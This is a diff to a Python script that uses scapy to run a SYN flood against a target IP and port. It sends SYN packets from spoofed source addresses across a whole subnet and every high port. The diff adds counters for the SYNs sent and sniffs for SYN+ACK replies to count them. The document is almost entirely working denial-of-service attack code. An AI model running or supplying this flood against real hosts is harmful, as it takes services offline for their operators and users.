@@ -24,9 +24,12 @@ import signal
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
+sa_counter=0 
+s_counter =0
 
 def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int, spoof_ip=True):
     # the actual code that will be sending SYN packets
+    global sa_counter, s_counter
     for src_host in range(1, 254):
         for src_port in range(1024, 65535):
             # Build the packet
@@ -34,10 +37,19 @@ def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int, spoof_ip=True):
             network_layer = IP(src=src_ip, dst=dst_ip) if spoof_ip else \
                     IP(dst=dst_ip)
             transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")
-
+            print (str(s_counter) + "  " + str(sa_counter))
             # Send the packet
             try:
                 send(network_layer/transport_layer, verbose=False)
+                s_counter = s_counter+1
+
+                ans = sniff(filter="tcp port %s"%str(dst_port),count=1,timeout=1)
+                pkt = ans[0] 
+
+                if pkt[TCP].flags & 0x3f == 0x12:  
+                    #rint ("SYN+ACK")
+                    sa_counter = sa_counter+1
+            
             except Exception as e:
                 print("[-] Something went terribly wrong: {e}".format(e=e))
                 sys.exit()
